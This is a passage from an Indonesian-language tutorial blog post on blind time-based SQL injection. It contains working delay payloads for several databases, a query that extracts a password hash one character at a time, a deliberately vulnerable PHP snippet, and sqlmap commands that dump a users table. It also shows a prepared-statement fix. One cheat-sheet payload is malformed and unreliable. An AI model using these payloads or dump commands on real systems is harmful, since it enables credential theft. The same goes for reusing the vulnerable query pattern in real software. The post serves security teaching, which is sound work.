---
title: "SQL Injection — Blind Time-Based"
date: 2026-04-18T01:00:01+07:00
draft: false
author: "Andrew"
summary: "Blind Time-Based SQL Injection adalah teknik di mana attacker memanfaatkan perbedaan waktu respons aplikasi untuk menentukan apakah suatu kondisi dalam database benar atau salah, memungkinkan mereka mengekstrak data satu karakter pada satu waktu."
tags: ["Web Penetration Testing", "SQL Injection", "Blind Time-Based"]
categories: ["Web Penetration Testing", "SQL Injection"]
description: ""
---

# SQL Injection — Blind Time Based

## Apa Itu Blind Time-Based SQLi?

Blind Boolean-based sudah cukup challenging, tapi bagaimana jika aplikasi merespons dengan sama persis setiap kali, tidak peduli kondisi TRUE atau FALSE? Tidak ada response yang dapat dibedakan.

Masukkan **Blind Time-Based SQLi**.

Teknik ini memanfaatkan fungsi `SLEEP()` atau fungsi penundaan lainnya dalam SQL untuk menciptakan perbedaan dalam response time. Jika query yang disuntikkan menyebabkan sleep, aplikasi akan lambat merespons. Attacker tidak melihat data secara langsung, mereka mengukur waktu response untuk membedakan TRUE dari FALSE.

---

## Cara Kerjanya

**Konsep Dasar:**

Payload mengandung fungsi SQL yang menyebabkan penundaan buatan. Jika kondisi TRUE, penundaan terjadi. Jika FALSE, tidak ada penundaan. Attacker mengukur waktu response:

```
Normal request (baseline):
GET /product?id=1 → Response dalam ~50ms

TRUE condition dengan sleep:
GET /product?id=1 AND (SELECT 1 FROM users WHERE username='admin') AND SLEEP(5)--
→ Response dalam ~5050ms (5 detik lebih lambat)

FALSE condition dengan sleep:
GET /product?id=1 AND (SELECT 1 FROM users WHERE username='nonexistent') AND SLEEP(5)--
→ Response dalam ~50ms (tidak ada sleep)
```

**Catatan penting:** Baseline response time harus diukur terlebih dahulu. Setiap database juga memiliki fungsinya masing-masing:

| Database | Sleep Function |
|----------|---------------|
| MySQL | `SLEEP(n)` |
| PostgreSQL | `pg_sleep(n)` |
| Microsoft SQL Server | `WAITFOR DELAY 'n'` |
| Oracle | `DBMS_LOCK.SLEEP(n)` |

---

## Exploitation: Character-by-Character via Time Delay

```python
# Attacker wants to know the password hash of user 'admin'
# Sending payload:
GET /product?id=1 AND (SELECT CASE WHEN (
    SUBSTRING(password,1,1) = 'a'
) THEN SLEEP(5) ELSE 0 END FROM users WHERE username='admin')--
```

**Flow Diagram:**

```
┌─────────────────────────────────────────────────────────────┐
│  Attacker sends:                                             │
│  GET /product?id=1 AND (SELECT CASE WHEN (                  │
│      SUBSTRING(password,1,1) = 'a'                          │
│  ) THEN SLEEP(5) ELSE 0 END FROM users)--                   │
│                                                             │
│         │                                                   │
│         ▼                                                   │
│  ┌─────────────────────────────────────────────────────┐   │
│  │ Server executes:                                     │   │
│  │ WHERE id=1 AND (SELECT CASE WHEN (SUBSTRING(...)    │   │
│  │ = 'a') THEN SLEEP(5) ELSE 0 END ...)                │   │
│  └─────────────────────────────────────────────────────┘   │
│         │                                                   │
│    ┌────┴────┐                                              │
│    ▼         ▼                                              │
│  ┌────┐  ┌────────┐                                         │
│  │TRUE│  │ FALSE  │                                         │
│  │    │  │        │                                         │
│  │SLEEP│  │ No     │                                         │
│  │5s   │  │ delay  │                                         │
│  └────┘  └────────┘                                           │
│    │         │                                               │
│    ▼         ▼                                               │
│  5 detik   ~50ms                                             │
│  Response                                          │
└─────────────────────────────────────────────────────────────┘
```

Dengan binary search (ASCII 48-122), attacker bisa menemukan satu karakter dalam ~7 requests (log2(75) ≈ 7). Satu password 32 karakter (MD5) = ~224 requests, masih feasible.

---

## Contoh Vulnerable Code

**PHP:**

```php
$product_id = $_GET['id'];
$query = "SELECT * FROM products WHERE id = $product_id";
$result = mysqli_query($conn, $query);
$product = mysqli_fetch_assoc($result);

if ($product) {
    echo json_encode(["status" => "ok", "data" => $product]);
} else {
    echo json_encode(["status" => "error"]);
}
```

Response JSON selalu sama strukturnya, tidak ada perbedaan visual antara TRUE dan FALSE. Attacker harus menggunakan time-based approach.

---

## Automasi dengan sqlmap

```bash
sqlmap -u "https://example.com/product?id=1" \
       --technique=T \
       --level=5 \
       --batch \
       --dump \
       -T users

# --technique=T  → Time-Based Blind
# --level=5     → Highest detection level
# --batch       → Auto-confirm prompts
```

**Mengekstrak hash spesifik:**

```bash
sqlmap -u "https://example.com/product?id=1" \
       --technique=T \
       -T users \
       -C password \
       --dump
```

---

## Mitigasi

```php
// SECURE: Prepared Statements satu-satunya solusi yang benar
$stmt = $conn->prepare("SELECT * FROM products WHERE id = ?");
$stmt->bind_param("i", $product_id);
$stmt->execute();
$result = $stmt->get_result();
```

**Prinsip umum:**
```
✅ Prepared Statements / Parameterized Queries
✅ Input validation dengan type casting (int untuk id)
✅ Jangan gunakan user input langsung dalam query
✅ Least privilege — DB user tidak butuh untuk sleep()
✅ WAF sebagai layer defense tambahan
```

---

## Cheat Sheet

| Database | Payload Pattern |
|----------|---------------|
| MySQL | `AND SLEEP(N)--` |
| MySQL (if locked) | `AND BENCHMARK(N, SHA1('test'))--` |
| PostgreSQL | `AND pg_sleep(N)--` |
| MSSQL | `AND WAITFOR DELAY 'N:SS:MMM'--` |
| Oracle | `AND DBMS_LOCK.SLEEP(N)--` |

| Purpose | Payload |
|---------|---------|
| Check vulnerability | `AND SLEEP(5)--` |
| Confirm vulnerability | `AND SLEEP(5) IF EXISTS(SELECT 1 FROM users, SLEEP(5))--` |
| Extract char (MySQL) | `AND IF(SUBSTRING(pwd,1,1)='a', SLEEP(5), 0)--` |
| ASCII binary search | `AND IF(ASCII(SUBSTRING(pwd,1,1))>100, SLEEP(5), 0)--` |

---

## Perbandingan dengan Jenis Lain

| Type | Response Differential | Speed |
|------|----------------------|-------|
| Union-Based | Ya (data visible) | Fast |
| Error-Based | Ya (error visible) | Fast |
| Blind Boolean | Tidak (response diff) | Slow |
| Blind Time-Based | Tidak (timing diff) | Slowest |

---

## Referensi

- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [sqlmap time-based blind](https://github.com/sqlmapproject/sqlmap/wiki/Usage#time-based-blind)
